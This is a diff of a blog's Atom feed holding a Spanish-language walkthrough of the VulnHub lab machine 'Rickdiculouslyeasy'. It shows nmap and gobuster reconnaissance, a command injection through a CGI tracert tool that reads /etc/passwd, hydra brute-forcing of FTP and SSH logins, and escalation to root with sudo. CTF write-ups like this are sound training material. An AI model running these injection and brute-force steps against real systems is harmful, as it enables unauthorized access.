@@ -1,1765 +1,1669 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-19T17:38:27+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">TheZombrex</title><subtitle>TheZombrex blog</subtitle><author><name>TheZombrex</name></author><entry><title type="html">Rickdiculouslyeasy: 1</title><link href="http://localhost:4000/vulnhub/rickdiculouslyeasy/" rel="alternate" type="text/html" title="Rickdiculouslyeasy: 1" /><published>2022-08-14T00:00:00+02:00</published><updated>2022-08-14T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/rickdiculouslyeasy</id><content type="html" xml:base="http://localhost:4000/vulnhub/rickdiculouslyeasy/"><![CDATA[[https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-13T05:22:07+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">TheZombrex</title><subtitle>TheZombrex blog</subtitle><author><name>TheZombrex</name></author><entry><title type="html">Rickdiculouslyeasy: 1</title><link href="http://localhost:4000/vulnhub/rickdiculouslyeasy/" rel="alternate" type="text/html" title="Rickdiculouslyeasy: 1" /><published>2022-08-14T00:00:00+02:00</published><updated>2022-08-14T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/rickdiculouslyeasy</id><content type="html" xml:base="http://localhost:4000/vulnhub/rickdiculouslyeasy/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/">https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/</a></p>
 
-Realizar un escaneo nmap a la red para buscar el equipo
+<p>Realizar un escaneo nmap a la red para buscar el equipo</p>
 
-```bash
-sudo nmap -vvv -sS -sV -O -Pn 192.168.122.0/24
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/1.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/1.png" alt="image-center" class="align-center" /></p>
 
-Saldrá una máquina con varios puertos abiertos
+<p>Saldrá una máquina con varios puertos abiertos</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/2.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/2.png" alt="image-center" class="align-center" /></p>
 
-Realizar un escaneo nmap profundo
-```bash
-sudo nmap -vvv -sS -sV -sC -O -p- -Pn 192.168.122.11 -oG allports
-```
+<p>Realizar un escaneo nmap profundo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-O</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> 192.168.122.11 <span class="nt">-oG</span> allports
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/3.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/3.png" alt="image-center" class="align-center" /></p>
 
-Se podrá encontrar una flag entre toda la información
+<p>Se podrá encontrar una flag entre toda la información</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/4.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/4.png" alt="image-center" class="align-center" /></p>
 
-Entrar en la web
+<p>Entrar en la web</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/5.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/5.png" alt="image-center" class="align-center" /></p>
 
-Buscar directorios ocultos en la web, aparecerá un `robots.txt`
-```bash
-sudo gobuster dir -u 192.168.122.11 -w /usr/share/wordlists/dirb/big.txt
-```
+<p>Buscar directorios ocultos en la web, aparecerá un <code class="language-plaintext highlighter-rouge">robots.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.11 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/6.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/6.png" alt="image-center" class="align-center" /></p>
 
-Ir a `/passwords`, saldrá una flag y un archivo llamado `passwords.html`
+<p>Ir a <code class="language-plaintext highlighter-rouge">/passwords</code>, saldrá una flag y un archivo llamado <code class="language-plaintext highlighter-rouge">passwords.html</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/7.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/7.png" alt="image-center" class="align-center" /></p>
 
-Ir a flag, mostrará una de las flags
+<p>Ir a flag, mostrará una de las flags</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/8.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/8.png" alt="image-center" class="align-center" /></p>
 
-Ir a passwords.html
+<p>Ir a passwords.html</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/9.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/9.png" alt="image-center" class="align-center" /></p>
 
-Mostrar el código fuente, mostrará una contraseña
+<p>Mostrar el código fuente, mostrará una contraseña</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/10.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/10.png" alt="image-center" class="align-center" /></p>
 
-Ir a `robots.txt` también visto con el gobuster, mostrará tres rutas
+<p>Ir a <code class="language-plaintext highlighter-rouge">robots.txt</code> también visto con el gobuster, mostrará tres rutas</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/11.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/11.png" alt="image-center" class="align-center" /></p>
 
-El primer directorio no mostrará nada relevante
-Ir al segundo directorio `/cgi-bin-tracertool.cgi`, mostrará una herramienta que servirá para ejecutar un tracert desde la máquina víctima a una IP que sea escrita
+<p>El primer directorio no mostrará nada relevante
+Ir al segundo directorio <code class="language-plaintext highlighter-rouge">/cgi-bin-tracertool.cgi</code>, mostrará una herramienta que servirá para ejecutar un tracert desde la máquina víctima a una IP que sea escrita</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/12.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/12.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/13.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/13.png" alt="image-center" class="align-center" /></p>
 
-Al probar a concatenar comandos funcionará. Es importante cerrar el tracert con un punto y coma para seguidamente introducir el comando deseado como se ve en la imagen.
+<p>Al probar a concatenar comandos funcionará. Es importante cerrar el tracert con un punto y coma para seguidamente introducir el comando deseado como se ve en la imagen.</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/14.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/14.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/15.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/15.png" alt="image-center" class="align-center" /></p>
 
-Tratar de mostrar archivos del equipo, en este caso el `/etc/passwd`
+<p>Tratar de mostrar archivos del equipo, en este caso el <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
 
-```bash
-; tail /etc/pass
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="nb">tail</span> /etc/pass
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/16.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/16.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/17.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/17.png" alt="image-center" class="align-center" /></p>
 
-Aparecerán varios usuarios que añadiremos en un diccionario de usuarios, los usuarios son:
+<p>Aparecerán varios usuarios que añadiremos en un diccionario de usuarios, los usuarios son:</p>
 
-- RickSanchez
-- Summer
-- Morty
-Añadirlos a un diccionario de usuarios del siguiente modo
+<ul>
+  <li>RickSanchez</li>
+  <li>Summer</li>
+  <li>Morty
+Añadirlos a un diccionario de usuarios del siguiente modo</li>
+</ul>
 
-```bash
-cat >> users.txt
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&gt;&gt;</span> users.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/18.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/18.png" alt="image-center" class="align-center" /></p>
 
-Buscar el usuario al que pertenece la contraseña vista anteriormente en `passwords.html` utilizando hydra y el diccionario creado en el paso anterior, en este caso será al servidor ftp. Saldrá que la contraseña es del usuario `Summer`.
+<p>Buscar el usuario al que pertenece la contraseña vista anteriormente en <code class="language-plaintext highlighter-rouge">passwords.html</code> utilizando hydra y el diccionario creado en el paso anterior, en este caso será al servidor ftp. Saldrá que la contraseña es del usuario <code class="language-plaintext highlighter-rouge">Summer</code>.</p>
 
-```bash
-sudo hydra -L users.txt -p winter 192.168.122.11 ftp
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-L</span> users.txt <span class="nt">-p</span> winter 192.168.122.11 ftp
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/19.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/19.png" alt="image-center" class="align-center" /></p>
 
-Entrar por ftp con el usuario `Summer` y la contraseña `winter`
+<p>Entrar por ftp con el usuario <code class="language-plaintext highlighter-rouge">Summer</code> y la contraseña <code class="language-plaintext highlighter-rouge">winter</code></p>
 
-```bash
-ftp 192.168.122.11
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 192.168.122.11
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/20.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/20.png" alt="image-center" class="align-center" /></p>
 
-Descargar el archivo `FLAG.txt`
+<p>Descargar el archivo <code class="language-plaintext highlighter-rouge">FLAG.txt</code></p>
 
-```bash
-get FLAG.txt
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get FLAG.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/21.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/21.png" alt="image-center" class="align-center" /></p>
 
-Leer el archivo `FLAG.txt`
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">FLAG.txt</code></p>
 
-```bash
-cat FLAG.txt
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/22.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/22.png" alt="image-center" class="align-center" /></p>
 
-Tratar de entrar por ftp de forma anónima
+<p>Tratar de entrar por ftp de forma anónima</p>
 
-```bash
-ftp 192.168.122.11
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 192.168.122.11
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/23.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/23.png" alt="image-center" class="align-center" /></p>
 
-Descargar el archivo `FLAG.txt`
+<p>Descargar el archivo <code class="language-plaintext highlighter-rouge">FLAG.txt</code></p>
 
-```bash
-get FLAG.txt
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get FLAG.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/24.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/24.png" alt="image-center" class="align-center" /></p>
 
-Leer el archivo `FLAG.txt`
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">FLAG.txt</code></p>
 
-```bash
-cat FLAG.txt
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/25.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/25.png" alt="image-center" class="align-center" /></p>
 
-Tratar de entrar por ssh con el usuario Summer y la contraseña `winter`. Como se puede ver en los puertos aparecen `22` y `22222`. Esto es porque el servidor SSH ha sido configurado para usar el puerto `22222`, es por esto que habrá que especificarlo.
+<p>Tratar de entrar por ssh con el usuario Summer y la contraseña <code class="language-plaintext highlighter-rouge">winter</code>. Como se puede ver en los puertos aparecen <code class="language-plaintext highlighter-rouge">22</code> y <code class="language-plaintext highlighter-rouge">22222</code>. Esto es porque el servidor SSH ha sido configurado para usar el puerto <code class="language-plaintext highlighter-rouge">22222</code>, es por esto que habrá que especificarlo.</p>
 
-```bash
-ssh Summer@192.168.122.11 -p 22222  
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh Summer@192.168.122.11 <span class="nt">-p</span> 22222  
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/26.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/26.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/27.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/27.png" alt="image-center" class="align-center" /></p>
 
-Dará acceso al equipo, mostrar el contenido del directorio actual.
+<p>Dará acceso al equipo, mostrar el contenido del directorio actual.</p>
 
-```bash
-ls
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/28.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/28.png" alt="image-center" class="align-center" /></p>
 
-Al intentar leer el archivo FLAG.txt con el comando cat aparecerá un gato, esto obliga a utilizar otro método para leerlo como puede ser el comando `tail`, `head` o `base64`
+<p>Al intentar leer el archivo FLAG.txt con el comando cat aparecerá un gato, esto obliga a utilizar otro método para leerlo como puede ser el comando <code class="language-plaintext highlighter-rouge">tail</code>, <code class="language-plaintext highlighter-rouge">head</code> o <code class="language-plaintext highlighter-rouge">base64</code></p>
 
-```bash
-cat FLAG.txt
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/29.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/29.png" alt="image-center" class="align-center" /></p>
 
-Usar `tail` para leer el archivo
+<p>Usar <code class="language-plaintext highlighter-rouge">tail</code> para leer el archivo</p>
 
-```bash
-tail FLAG.txt
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail </span>FLAG.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/30.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/30.png" alt="image-center" class="align-center" /></p>
 
-Ir al directorio anterior y mostrar el contenido para mostrar los directorios personales de los otros usuarios del sistema
+<p>Ir al directorio anterior y mostrar el contenido para mostrar los directorios personales de los otros usuarios del sistema</p>
 
-```bash
-cd ..
-ls
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ..
+<span class="nb">ls</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/31.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/31.png" alt="image-center" class="align-center" /></p>
 
-Ir a Morty y mostrar el contenido
+<p>Ir a Morty y mostrar el contenido</p>
 
-```bash
-cd Morty/
-ls
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>Morty/
+<span class="nb">ls</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/32.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/32.png" alt="image-center" class="align-center" /></p>
 
-Comprobar que el archivo `Safe_Password.jpg` es realmente una imagen
+<p>Comprobar que el archivo <code class="language-plaintext highlighter-rouge">Safe_Password.jpg</code> es realmente una imagen</p>
 
-```bash
-file Safe_Password.jpg
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file Safe_Password.jpg
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/33.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/33.png" alt="image-center" class="align-center" /></p>
 
-Leer el contenido del archivo para comprobar que no haya nada oculto en el código de la imagen , mostrará una contraseña que es `Meeseek`
+<p>Leer el contenido del archivo para comprobar que no haya nada oculto en el código de la imagen , mostrará una contraseña que es <code class="language-plaintext highlighter-rouge">Meeseek</code></p>
 
-```bash
-head Safe_Password.jpg
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">head </span>Safe_Password.jpg
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/34.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/34.png" alt="image-center" class="align-center" /></p>
 
-Descomprimir el archivo `journal.txt.zip` con la contraseña Meeseek, mostrará otra flag y también la contraseña para algún archivo que es seguro
+<p>Descomprimir el archivo <code class="language-plaintext highlighter-rouge">journal.txt.zip</code> con la contraseña Meeseek, mostrará otra flag y también la contraseña para algún archivo que es seguro</p>
 
-```bash
-unzip -c journal.txt.zip
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip <span class="nt">-c</span> journal.txt.zip
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/35.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/35.png" alt="image-center" class="align-center" /></p>
 
-Ir al directorio personal de `RickSanchez` y dentro de él a `RICKS_SAFE/`
+<p>Ir al directorio personal de <code class="language-plaintext highlighter-rouge">RickSanchez</code> y dentro de él a <code class="language-plaintext highlighter-rouge">RICKS_SAFE/</code></p>
 
-```bash
-cd ../RickSanchez
-ls
-cd RICKS_SAFE/
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../RickSanchez
+<span class="nb">ls
+cd </span>RICKS_SAFE/
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/36.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/36.png" alt="image-center" class="align-center" /></p>
 
-Al tratar de ejecutar el archivo no será posible por los permisos
+<p>Al tratar de ejecutar el archivo no será posible por los permisos</p>
 
-```bash
-./safe
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./safe
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/37.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/37.png" alt="image-center" class="align-center" /></p>
 
-Copiar el archivo al directorio personal de Summer
+<p>Copiar el archivo al directorio personal de Summer</p>
 
-```bash
-cp safe ../../Summer/
-cd
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp </span>safe ../../Summer/
+<span class="nb">cd</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/38.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/38.png" alt="image-center" class="align-center" /></p>
 
-Ejecutar el script con la contraseña conseguida anteriormente en el archivo comprimido de Morty. Mostrará una pista para otra contraseña, la pista es que la contraseña cumple los siguientes requisitos:
+<p>Ejecutar el script con la contraseña conseguida anteriormente en el archivo comprimido de Morty. Mostrará una pista para otra contraseña, la pista es que la contraseña cumple los siguientes requisitos:</p>
 
-```bash
-./safe 131333
-```
-- Una letra mayúscula
-- Un dígito
-- Una de las palabras del nombre de su antigua banda
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./safe 131333
+</code></pre></div></div>
+<ul>
+  <li>Una letra mayúscula</li>
+  <li>Un dígito</li>
+  <li>Una de las palabras del nombre de su antigua banda</li>
+</ul>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/39.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/39.png" alt="image-center" class="align-center" /></p>
 
-Al buscar información sobre su antigua banda se podrá encontrar el nombre de `"The Flesh Curtains"`
+<p>Al buscar información sobre su antigua banda se podrá encontrar el nombre de <code class="language-plaintext highlighter-rouge">"The Flesh Curtains"</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/40.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/40.png" alt="image-center" class="align-center" /></p>
 
-Crear un diccionario de contraseñas utilizando `Maskprocessor`, este programa permite crear ficcionarios especificando patrones. (ZSH no rinde bien con caracteres especiales cómo "?", por ello utilizo bash para este paso)
+<p>Crear un diccionario de contraseñas utilizando <code class="language-plaintext highlighter-rouge">Maskprocessor</code>, este programa permite crear ficcionarios especificando patrones. (ZSH no rinde bien con caracteres especiales cómo “?”, por ello utilizo bash para este paso)</p>
 
-`mp64 ?u?dCurtains      <- ?u Significará una letra mayúscula, ?d Significará un dígito del 0 al 9`
+<p><code class="language-plaintext highlighter-rouge">mp64 ?u?dCurtains      &lt;- ?u Significará una letra mayúscula, ?d Significará un dígito del 0 al 9</code></p>
 
-Especificar tanto para los nombres flesh y curtains tanto en mayúscula como en minúscula
+<p>Especificar tanto para los nombres flesh y curtains tanto en mayúscula como en minúscula</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/41.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/41.png" alt="image-center" class="align-center" /></p>
 
-Utilizar `hydra` para encontrar la contraseña del usuario RickSanchez con el diccionario creado anteriormente y con el puerto 22222. Después de un tiempo mostrará la contraseña del usuario RickSanchez
+<p>Utilizar <code class="language-plaintext highlighter-rouge">hydra</code> para encontrar la contraseña del usuario RickSanchez con el diccionario creado anteriormente y con el puerto 22222. Después de un tiempo mostrará la contraseña del usuario RickSanchez</p>
 
-```bash
-sudo hydra -t 64 -l RickSanchez -P names.txt 192.168.122.11 ssh -s 22222
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-t</span> 64 <span class="nt">-l</span> RickSanchez <span class="nt">-P</span> names.txt 192.168.122.11 ssh <span class="nt">-s</span> 22222
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/42.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/42.png" alt="image-center" class="align-center" /></p>
 
-Cambiar al usuario RickSanshez
+<p>Cambiar al usuario RickSanshez</p>
 
-```bash
-su RickSanchez
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su RickSanchez
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/43.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/43.png" alt="image-center" class="align-center" /></p>
 
-Ver los permisos de RickSanchez, mostrará que tiene todos los permisos
+<p>Ver los permisos de RickSanchez, mostrará que tiene todos los permisos</p>
 
-```bash
-sudo -l
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/44.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/44.png" alt="image-center" class="align-center" /></p>
 
-Cambiar al usuario root
+<p>Cambiar al usuario root</p>
 
-```bash
-sudo su
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/45.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/45.png" alt="image-center" class="align-center" /></p>
 
-Ir al directorio /root y mostrar el contenido
+<p>Ir al directorio /root y mostrar el contenido</p>
 
-```bash
-cd /root
-ls
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root
+<span class="nb">ls</span>
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/46.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/46.png" alt="image-center" class="align-center" /></p>
 
-Leer el archivo FLAG.txt
+<p>Leer el archivo FLAG.txt</p>
 
-```bash
-tail FLAG.txt
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail </span>FLAG.txt
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/47.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/47.png" alt="image-center" class="align-center" /></p>
 
-Puede encontrarse otra flag accediendo a le web con el puerto `9090`
+<p>Puede encontrarse otra flag accediendo a le web con el puerto <code class="language-plaintext highlighter-rouge">9090</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/rickdiculouslyeasy/48.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/48.png" alt="image-center" class="align-center" /></p>
 
-## Flags
+<h2 id="flags">Flags</h2>
 
-FLAG:{TheyFoundMyBackDoorMorty}-10Points\n")
